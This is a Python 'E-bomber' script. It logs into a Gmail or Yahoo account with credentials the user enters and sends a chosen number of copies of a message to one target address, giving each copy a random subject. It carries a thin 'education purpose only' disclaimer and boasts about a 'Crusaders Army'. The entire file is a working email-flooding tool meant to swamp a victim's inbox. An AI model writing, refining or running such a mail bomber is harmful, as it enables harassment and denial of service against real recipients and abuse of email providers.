#!/usr/bin/python
# E-bomber
# This code for education purpose only.
# Use it at your own risk !
# Developer: Archangel

print('''
     
                                                                              
Version 1.5
   ____ ______  __    __  _____ ____   ______    ___________    
  / ___|   __ \ ) )  ( ( / ____(    ) (_  __ \  / ___(   __ \   
 / /    ) (__) | (    ) | (___ / /\ \   ) ) \ \( (__  ) (__) )  
( (    (    __/ ) )  ( ( \___ ( (__) ) ( (   ) )) __)(    __/   
( (     ) \ \  ( (    ) )    ) )    (   ) )  ) | (    ) \ \  _  
 \ \___( ( \ \_)) \__/ ( ___/ /  /\  \ / /__/ / \ \__( ( \ \_)) 
  \____))_) \__/\______//____/__(  )__(______/   \____)_) \__/  
                                                                
 ______   ____   __    __   ______                              
(_   _ \ / __ \  \ \  / /  (_   _ \                             
  ) (_) ) /  \ \ () \/ ()    ) (_) )                            
  \   _( ()  () )/ _  _ \    \   _/                             
  /  _ ( ()  () ) / \/ \ \   /  _ \                     
 _) (_) ) \__/ /_/      \_\ _) (_) )                            
(______/ \____(/          \|______/         Developer: Archangel
                                                  
>---------------------------------------------<
   If You Want To Stop Crusader Close Window
>---------------------------------------------<''')

import playsound
playsound.playsound('msc.mp3', False)
import playsound
playsound.playsound('Wc.mp3', False)
import time
time.sleep(5)

import os
import smtplib
import getpass
import sys
import playsound
playsound.playsound('Ch.mp3', False)
server = input('MailServer Gmail/Yahoo: ')
import playsound
playsound.playsound('En.mp3', False)
user = input('Email: ')
import playsound
playsound.playsound('Pa.mp3', False)
passwd = getpass.getpass('Password: ')

import playsound
playsound.playsound('trg.mp3', False)
to = input('\nTo: ')
# subject = input('Subject: ')
import playsound
playsound.playsound('sp.mp3', False)
body = input('Message: ')
import playsound
playsound.playsound('nmbr.mp3', False)
total = input('Amount of Crusaders Army: ')
import playsound
playsound.playsound('bmb.mp3', False)

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print('Applies only to gmail and yahoo.')
    sys.exit()

'print'


try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
        server.starttls()
    server.login(user, passwd)
    for i in range(1, int(total) + 1):
        subject = os.urandom(9)
        msg = 'From: ' + str(user) + '\nSubject: ' + str(subject) + '\n' + str(body)
        server.sendmail(user, to, msg)
        print("\rCrusader sent: %i" % i)
        sys.stdout.flush()
    server.quit()
    print('\n Done.')
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] The username or password you entered is incorrect.')
    sys.exit()
input("Press enter to close")


